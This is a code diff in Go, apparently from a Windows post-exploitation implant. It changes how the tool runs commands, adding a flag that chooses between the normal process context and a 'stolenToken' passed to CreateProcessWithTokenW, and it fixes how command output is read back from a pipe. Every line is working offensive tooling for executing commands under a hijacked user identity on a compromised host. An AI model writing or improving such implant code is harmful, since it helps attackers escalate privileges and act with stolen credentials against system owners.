@@ -120,7 +120,7 @@ func runNative(path string, args string) ([]byte, error) {
 	} else {
 		return nil, errors.New("path is not null or %COMSPEC%")
 	}
-	err = createProcessNative(pathPtr, windows.StringToUTF16Ptr(args), nil, nil, true, 0, nil, nil, &sI, &pI)
+	err = createProcessNative(pathPtr, windows.StringToUTF16Ptr(args), nil, nil, true, 0, nil, nil, &sI, &pI, false)
 
 	if err != nil {
 		return nil, err
@@ -135,7 +135,8 @@ func runNative(path string, args string) ([]byte, error) {
 	buf := make([]byte, 1024*8)
 	//var done uint32 = 4096
 	var read windows.Overlapped
-	_ = windows.ReadFile(hRPipe, buf, nil, &read)
+	var bytesRead uint32
+	_ = windows.ReadFile(hRPipe, buf, &bytesRead, &read)
 
 	return buf[:read.InternalHigh], nil
 }
@@ -148,12 +149,12 @@ func execNative(b []byte) error {
 	// when appName set to null, will use the first part of commandLine as the app, and rest as args
 	defer windows.CloseHandle(pI.Process)
 	defer windows.CloseHandle(pI.Thread)
-	return createProcessNative(nil, program, nil, nil, true, 0, nil, nil, &sI, &pI)
+	return createProcessNative(nil, program, nil, nil, true, 0, nil, nil, &sI, &pI, false)
 }
 
 // if there is a token, use it to create new process
-func createProcessNative(appName *uint16, commandLine *uint16, procSecurity *windows.SecurityAttributes, threadSecurity *windows.SecurityAttributes, inheritHandles bool, creationFlags uint32, env *uint16, currentDir *uint16, startupInfo *windows.StartupInfo, outProcInfo *windows.ProcessInformation) error {
-	if isTokenValid {
+func createProcessNative(appName *uint16, commandLine *uint16, procSecurity *windows.SecurityAttributes, threadSecurity *windows.SecurityAttributes, inheritHandles bool, creationFlags uint32, env *uint16, currentDir *uint16, startupInfo *windows.StartupInfo, outProcInfo *windows.ProcessInformation, ignoreToken bool) error {
+	if !ignoreToken && isTokenValid {
 		_, _, err := createProcessWithTokenW.Call(uintptr(stolenToken), LOGON_WITH_PROFILE, uintptr(unsafe.Pointer(appName)), uintptr(unsafe.Pointer(commandLine)), uintptr(creationFlags), uintptr(unsafe.Pointer(env)), uintptr(unsafe.Pointer(currentDir)), uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(outProcInfo)))
 		if err != nil && err != windows.SEVERITY_SUCCESS {
 			return errors.New(fmt.Sprintf("CreateProcessWithTokenW error: %s", err))
